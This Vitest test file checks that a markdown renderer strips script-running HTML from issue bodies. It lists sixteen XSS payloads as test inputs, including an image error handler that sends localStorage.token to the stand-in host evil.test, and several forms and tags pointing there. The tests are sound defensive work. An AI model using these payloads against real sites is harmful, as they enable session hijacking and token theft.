// @vitest-environment jsdom
/**
 * The token lives in localStorage on the same origin as this app, so anything that
 * could run a script from an issue body could steal it. These tests are the proof
 * that it cannot — they are as important as the tests about data.
 */
import { describe, it, expect } from 'vitest';
import { renderMarkdown, toPlainText } from '../lib/markdown';

describe('renderMarkdown blocks script execution', () => {
  const attacks: Array<[string, string]> = [
    ['a plain script tag', '<script>alert(localStorage.getItem("board.token"))</script>'],
    ['an image error handler', '<img src=x onerror="fetch(\'//evil.test?t=\'+localStorage.token)">'],
    ['a javascript: link', '[click me](javascript:alert(document.cookie))'],
    ['an svg onload', '<svg onload="alert(1)"></svg>'],
    ['an iframe', '<iframe src="https://evil.test"></iframe>'],
    ['an inline event handler', '<div onclick="alert(1)">tap</div>'],
    ['a style tag', '<style>body{display:none}</style>'],
    ['a form that posts elsewhere', '<form action="https://evil.test"><input name="t"></form>'],
    ['a data: URL image', '<img src="data:text/html,<script>alert(1)</script>">'],
    ['an object tag', '<object data="https://evil.test"></object>'],
    ['a meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.test">'],
    ['a link stylesheet', '<link rel="stylesheet" href="https://evil.test/x.css">'],
    ['a base tag', '<base href="https://evil.test/">'],
    ['nested encoding', '<img src="x" onerror="&#97;lert(1)">'],
    ['an uppercase script tag', '<SCRIPT>alert(1)</SCRIPT>'],
    ['a broken-up script tag', '<scr<script>ipt>alert(1)</script>'],
  ];

  for (const [name, source] of attacks) {
    it(`strips ${name}`, () => {
      const html = renderMarkdown(source);
      expect(html.toLowerCase()).not.toContain('<script');
      expect(html.toLowerCase()).not.toContain('onerror');
      expect(html.toLowerCase()).not.toContain('onload');
      expect(html.toLowerCase()).not.toContain('onclick');
      expect(html.toLowerCase()).not.toContain('javascript:');
      expect(html.toLowerCase()).not.toContain('<iframe');
      expect(html.toLowerCase()).not.toContain('<object');
      expect(html.toLowerCase()).not.toContain('<style');
      expect(html.toLowerCase()).not.toContain('<form');
      expect(html.toLowerCase()).not.toContain('<link');
      expect(html.toLowerCase()).not.toContain('<base');
      expect(html.toLowerCase()).not.toContain('<meta');
    });
  }

  it('keeps the markdown people actually write', () => {
    const html = renderMarkdown('# Heading\n\n**bold** and *italic*\n\n- one\n- two\n\n`code`');
    expect(html).toContain('<h1');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<li>one</li>');
    expect(html).toContain('<code>code</code>');
  });

  it('keeps ordinary links but makes them safe to click', () => {
    const html = renderMarkdown('[GitHub](https://github.com/x/y)');
    expect(html).toContain('href="https://github.com/x/y"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).toContain('target="_blank"');
  });

  it('allows a normal https image', () => {
    const html = renderMarkdown('![shot](https://example.test/a.png)');
    expect(html).toContain('src="https://example.test/a.png"');
  });

  it('does not fall over on an empty or odd body', () => {
    expect(renderMarkdown('')).toBe('');
    expect(() => renderMarkdown('<<<>>>')).not.toThrow();
  });
});

describe('toPlainText', () => {
  it('flattens markdown for searching', () => {
    expect(toPlainText('# Title\n\n**bold** [link](http://x) `code`')).toBe('Title bold link');
  });
});
